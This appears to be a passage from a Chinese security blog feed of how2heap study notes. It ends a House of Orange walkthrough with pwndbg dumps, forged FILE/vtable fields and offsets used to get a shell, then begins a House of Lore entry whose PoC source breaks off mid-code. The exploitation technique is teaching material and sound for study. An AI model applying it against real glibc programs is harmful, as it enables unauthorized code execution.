class="hljs-variable">_markers</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_chain</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_fileno</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_flags2</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_old_offset</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_cur_column</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_vtable_offset</span> = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>  <span class="hljs-variable">_shortbuf</span> = <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-variable">_lock</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_offset</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">__pad1</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad2</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad3</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad4</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad5</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_mode</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_unused2</span> = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">19</span> times&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后修改fp-&gt;_IO_write_base</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sqf">$<span class="hljs-number">21</span> = &#123;<br>  <span class="hljs-variable">_flags</span> = <span class="hljs-number">1852400175</span>,<br>  <span class="hljs-variable">_IO_read_ptr</span> = <span class="hljs-number">0</span>x61 &lt;error: Cannot access memory at address <span class="hljs-number">0</span>x61&gt;,<br>  <span class="hljs-variable">_IO_read_end</span> = <span class="hljs-number">0</span>x7ffff7dd1b78 &lt;main_arena+<span class="hljs-number">88</span>&gt; <span class="hljs-string">&quot;\020@b&quot;</span>,<br>  <span class="hljs-variable">_IO_read_base</span> = <span class="hljs-number">0</span>x7ffff7dd2510 <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-variable">_IO_write_base</span> = <span class="hljs-number">0</span>x2 &lt;error: Cannot access memory at address <span class="hljs-number">0</span>x2&gt;,<br>  <span class="hljs-variable">_IO_write_ptr</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_write_end</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_buf_base</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_buf_end</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_save_base</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_backup_base</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_save_end</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_markers</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_chain</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_fileno</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_flags2</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_old_offset</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_cur_column</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_vtable_offset</span> = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>  <span class="hljs-variable">_shortbuf</span> = <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-variable">_lock</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_offset</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">__pad1</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad2</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad3</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad4</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad5</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_mode</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_unused2</span> = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">19</span> times&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p>随后修改了_IO_write_ptr</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs sqf">$<span class="hljs-number">22</span> = &#123;<br>  <span class="hljs-variable">_flags</span> = <span class="hljs-number">1852400175</span>,<br>  <span class="hljs-variable">_IO_read_ptr</span> = <span class="hljs-number">0</span>x61 &lt;error: Cannot access memory at address <span class="hljs-number">0</span>x61&gt;,<br>  <span class="hljs-variable">_IO_read_end</span> = <span class="hljs-number">0</span>x7ffff7dd1b78 &lt;main_arena+<span class="hljs-number">88</span>&gt; <span class="hljs-string">&quot;\020@b&quot;</span>,<br>  <span class="hljs-variable">_IO_read_base</span> = <span class="hljs-number">0</span>x7ffff7dd2510 <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-variable">_IO_write_base</span> = <span class="hljs-number">0</span>x2 &lt;error: Cannot access memory at address <span class="hljs-number">0</span>x2&gt;,<br>  <span class="hljs-variable">_IO_write_ptr</span> = <span class="hljs-number">0</span>x3 &lt;error: Cannot access memory at address <span class="hljs-number">0</span>x3&gt;,<br>  <span class="hljs-variable">_IO_write_end</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_buf_base</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_buf_end</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_save_base</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_backup_base</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_IO_save_end</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_markers</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_chain</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_fileno</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_flags2</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_old_offset</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_cur_column</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_vtable_offset</span> = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>  <span class="hljs-variable">_shortbuf</span> = <span class="hljs-string">&quot;&quot;</span>,<br>  <span class="hljs-variable">_lock</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">_offset</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">__pad1</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad2</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad3</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad4</span> = <span class="hljs-number">0</span>x0,<br>  <span class="hljs-variable">__pad5</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_mode</span> = <span class="hljs-number">0</span>,<br>  <span class="hljs-variable">_unused2</span> = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">19</span> times&gt;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在就只需要控制我们的jump_table就好了</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx top+<span class="hljs-number">12</span><br><span class="hljs-number">0x602460</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602470</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x000000000040078f<br><span class="hljs-number">0x602480</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x602490</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x6024a0</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>先将我们的jump_table伪造成0x40078f,然后赋值给我们的jump_table</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs sqf">$<span class="hljs-number">27</span> = &#123;<br>  file = &#123;<br>    <span class="hljs-variable">_flags</span> = <span class="hljs-number">1852400175</span>,<br>    <span class="hljs-variable">_IO_read_ptr</span> = <span class="hljs-number">0</span>x61 &lt;error: Cannot access memory at address <span class="hljs-number">0</span>x61&gt;,<br>    <span class="hljs-variable">_IO_read_end</span> = <span class="hljs-number">0</span>x7ffff7dd1b78 &lt;main_arena+<span class="hljs-number">88</span>&gt; <span class="hljs-string">&quot;\020@b&quot;</span>,<br>    <span class="hljs-variable">_IO_read_base</span> = <span class="hljs-number">0</span>x7ffff7dd2510 <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-variable">_IO_write_base</span> = <span class="hljs-number">0</span>x2 &lt;error: Cannot access memory at address <span class="hljs-number">0</span>x2&gt;,<br>    <span class="hljs-variable">_IO_write_ptr</span> = <span class="hljs-number">0</span>x3 &lt;error: Cannot access memory at address <span class="hljs-number">0</span>x3&gt;,<br>    <span class="hljs-variable">_IO_write_end</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_IO_buf_base</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_IO_buf_end</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_IO_save_base</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_IO_backup_base</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_IO_save_end</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_markers</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_chain</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_fileno</span> = <span class="hljs-number">0</span>,<br>    <span class="hljs-variable">_flags2</span> = <span class="hljs-number">0</span>,<br>    <span class="hljs-variable">_old_offset</span> = <span class="hljs-number">4196239</span>,<br>    <span class="hljs-variable">_cur_column</span> = <span class="hljs-number">0</span>,<br>    <span class="hljs-variable">_vtable_offset</span> = <span class="hljs-number">0</span> <span class="hljs-string">&#x27;\000&#x27;</span>,<br>    <span class="hljs-variable">_shortbuf</span> = <span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-variable">_lock</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_offset</span> = <span class="hljs-number">0</span>,<br>    <span class="hljs-variable">_codecvt</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_wide_data</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_freeres_list</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">_freeres_buf</span> = <span class="hljs-number">0</span>x0,<br>    <span class="hljs-variable">__pad5</span> = <span class="hljs-number">0</span>,<br>    <span class="hljs-variable">_mode</span> = <span class="hljs-number">0</span>,<br>    <span class="hljs-variable">_unused2</span> = <span class="hljs-string">&#x27;\000&#x27;</span> &lt;repeats <span class="hljs-number">19</span> times&gt;<br>  &#125;,<br>  vtable = <span class="hljs-number">0</span>x602460<br>&#125;<br></code></pre></td></tr></table></figure><p>现在再调用malloc因为会检测size,由于 size&lt;&#x3D; 2*SIZE_SZ,所以会触发 _IO_flush_all_lockp 中的 _IO_OVERFLOW 函数，虽然继续报错,但我们还是 get shell了</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>house of orange的运用一共有两个阶段</p><p>第一个阶段是在不使用free的情况下获取我们的free chunk</p><p>第二个阶段是伪造我们的vtable</p><p>首先,程序写了一个winner函数,该函数作用就是调用system函数</p><p>然后程序申请了chunk p1(0x400-16)</p><p>此时系统的top chunk大小为0x20c01</p><p>因为top chunk需要页对齐并且其PRE_INUSE标志位始终为1,因此我们将我们的size改成了0xc01</p><p>现在申请一个0x1000的chunk,系统就会开一个新页来存储我们的新chunk,而我们的旧的top chunk会被放入到unsorted bin中</p><p>好了,现在我们有了unsorted bin,下面可以开始伪造我们的file结构指针了</p><p>在第二阶段前,我们先将旧top chunk的size改成0x61</p><p>第二阶段中,程序先是把旧的top chunk-&gt;bk-&gt;fd指针指向了_io_list_ptr</p><p>为了绕过检测,我们首先要绕过两个检查</p><p>一个是_mode必须为0,另一个是_write_base&lt;_write_ptr</p><p>所以程序将我们伪造的_IO_write_base改为2,_IO_write_ptr改为3</p><p>然后把我们的jump_table指向winner函数,将top的前8个字节改成了”&#x2F;bin&#x2F;sh”</p><p>最后让我们的vtable指向jump_table</p><p>现在再次调用malloc函数,由于size无法通过检测,因此,程序会终止调用,从而触发我们构造好的链</p><p>于是,程序输出错误信息的同时,我们也拿到了shell</p><p>over~</p><p>最后,附上结构和偏移</p><p>结构:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">struct</span> _IO_FILE_plus<br>&#123;<br>    <span class="hljs-attribute">_IO_FILE</span>    file;<br>    <span class="hljs-attribute">IO_jump_t</span>   *vtable;<br>&#125;<br></code></pre></td></tr></table></figure><p>偏移</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-number">0</span>x0   <span class="hljs-variable">_flags</span><br><span class="hljs-number">0</span>x8   <span class="hljs-variable">_IO_read_ptr</span><br><span class="hljs-number">0</span>x10  <span class="hljs-variable">_IO_read_end</span><br><span class="hljs-number">0</span>x18  <span class="hljs-variable">_IO_read_base</span><br><span class="hljs-number">0</span>x20  <span class="hljs-variable">_IO_write_base</span><br><span class="hljs-number">0</span>x28  <span class="hljs-variable">_IO_write_ptr</span><br><span class="hljs-number">0</span>x30  <span class="hljs-variable">_IO_write_end</span><br><span class="hljs-number">0</span>x38  <span class="hljs-variable">_IO_buf_base</span><br><span class="hljs-number">0</span>x40  <span class="hljs-variable">_IO_buf_end</span><br><span class="hljs-number">0</span>x48  <span class="hljs-variable">_IO_save_base</span><br><span class="hljs-number">0</span>x50  <span class="hljs-variable">_IO_backup_base</span><br><span class="hljs-number">0</span>x58  <span class="hljs-variable">_IO_save_end</span><br><span class="hljs-number">0</span>x60  <span class="hljs-variable">_markers</span><br><span class="hljs-number">0</span>x68  <span class="hljs-variable">_chain</span><br><span class="hljs-number">0</span>x70  <span class="hljs-variable">_fileno</span><br><span class="hljs-number">0</span>x74  <span class="hljs-variable">_flags2</span><br><span class="hljs-number">0</span>x78  <span class="hljs-variable">_old_offset</span><br><span class="hljs-number">0</span>x80  <span class="hljs-variable">_cur_column</span><br><span class="hljs-number">0</span>x82  <span class="hljs-variable">_vtable_offset</span><br><span class="hljs-number">0</span>x83  <span class="hljs-variable">_shortbuf</span><br><span class="hljs-number">0</span>x88  <span class="hljs-variable">_lock</span><br><span class="hljs-number">0</span>x90  <span class="hljs-variable">_offset</span><br><span class="hljs-number">0</span>x98  <span class="hljs-variable">_codecvt</span><br><span class="hljs-number">0</span>xa0  <span class="hljs-variable">_wide_data</span><br><span class="hljs-number">0</span>xa8  <span class="hljs-variable">_freeres_list</span><br><span class="hljs-number">0</span>xb0  <span class="hljs-variable">_freeres_buf</span><br><span class="hljs-number">0</span>xb8  <span class="hljs-variable">__pad5</span><br><span class="hljs-number">0</span>xc0  <span class="hljs-variable">_mode</span><br><span class="hljs-number">0</span>xc4  <span class="hljs-variable">_unused2</span><br><span class="hljs-number">0</span>xd8  vtable<br></code></pre></td></tr></table></figure><p>IO_jump_t *vtable:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs awk">void * funcs[] = &#123;<br>   <span class="hljs-number">1</span> NULL, <span class="hljs-regexp">//</span> <span class="hljs-string">&quot;extra word&quot;</span><br>   <span class="hljs-number">2</span> NULL, <span class="hljs-regexp">//</span> DUMMY<br>   <span class="hljs-number">3</span> <span class="hljs-keyword">exit</span>, <span class="hljs-regexp">//</span> finish<br>   <span class="hljs-number">4</span> NULL, <span class="hljs-regexp">//</span> overflow<br>   <span class="hljs-number">5</span> NULL, <span class="hljs-regexp">//</span> underflow<br>   <span class="hljs-number">6</span> NULL, <span class="hljs-regexp">//</span> uflow<br>   <span class="hljs-number">7</span> NULL, <span class="hljs-regexp">//</span> pbackfail<br>   <br>   <span class="hljs-number">8</span> NULL, <span class="hljs-regexp">//</span> xsputn  <span class="hljs-comment">#printf</span><br>   <span class="hljs-number">9</span> NULL, <span class="hljs-regexp">//</span> xsgetn<br>   <span class="hljs-number">10</span> NULL, <span class="hljs-regexp">//</span> seekoff<br>   <span class="hljs-number">11</span> NULL, <span class="hljs-regexp">//</span> seekpos<br>   <span class="hljs-number">12</span> NULL, <span class="hljs-regexp">//</span> setbuf<br>   <span class="hljs-number">13</span> NULL, <span class="hljs-regexp">//</span> sync<br>   <span class="hljs-number">14</span> NULL, <span class="hljs-regexp">//</span> doallocate<br>   <span class="hljs-number">15</span> NULL, <span class="hljs-regexp">//</span> read<br>   <span class="hljs-number">16</span> NULL, <span class="hljs-regexp">//</span> write<br>   <span class="hljs-number">17</span> NULL, <span class="hljs-regexp">//</span> seek<br>   <span class="hljs-number">18</span> pwn,  <span class="hljs-regexp">//</span> close<br>   <span class="hljs-number">19</span> NULL, <span class="hljs-regexp">//</span> stat<br>   <span class="hljs-number">20</span> NULL, <span class="hljs-regexp">//</span> showmanyc<br>   <span class="hljs-number">21</span> NULL, <span class="hljs-regexp">//</span> imbue<br>&#125;;<br></code></pre></td></tr></table></figure><p>在libc版本&gt;2.23后虽然加了检测机制,但我们依旧可以通过改 vtable为 _IO_str_jump来绕过检测,将偏移0xe0处设置为one_gadget即可</p><p>文章首发于安全客，转载请著名出处，文章链接<a href="https://www.anquanke.com/post/id/197832">https://www.anquanke.com/post/id/197832</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>how2heap总结计划六</title>
    <link href="/2020/02/01/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%85%AD/"/>
    <url>/2020/02/01/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E5%85%AD/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本文包含 house of lore,house of force</p></blockquote><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>ctf-wiki.github.io<span class="hljs-regexp">/ctf-wiki/</span>pwn/<br></code></pre></td></tr></table></figure><h1 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h1><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>我们的house of lore其实就是利用了small bin的机制而导致的任意地址分配,所利用的地方就是</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xl">[ ... ]<br><br><span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-function"><span class="hljs-title">bck</span> = victim-&gt;</span>bk;<br>    <span class="hljs-function"><span class="hljs-title">if</span> (__glibc_unlikely (bck-&gt;</span>fd != victim))&#123;<br><br>                  errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                  goto errout;<br>                &#125;<br><br>       set_inuse_bit_at_offset (victim, nb);<br>       <span class="hljs-function"><span class="hljs-title">bin</span>-&gt;</span>bk = bck;<br>       <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = bin;<br><br>       [ ... ]<br></code></pre></td></tr></table></figure><p>我们需要做的,就是将small bin的bk指针指向我们的fake chunk,也就是控制bck,但是要注意的是bck-&gt;fd!&#x3D;victim这个地方需要绕过</p><p>关于small bin在最2.29中其实还有一种攻击方法,但是这里就不再详述了</p><p>这里要注意一下的就是程序推荐在ubuntu 14.04 32位机上测试,但我是在ubuntu 16.04的64位机上测试的,所以会有一些出入,但其实问题不大</p><h2 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h2><p>这里我就不删了,只加了一点注释</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span><br><span class="hljs-comment">This PoC take care also of the glibc hardening of smallbin corruption.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">[ ... ]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">else</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">      bck = victim-&gt;bk;</span><br><span class="hljs-comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="hljs-comment">                  goto errout;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="hljs-comment">       bin-&gt;bk = bck;</span><br><span class="hljs-comment">       bck-&gt;fd = bin;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       [ ... ]</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Nice jump d00d&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span></span>&#123;<br><br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* 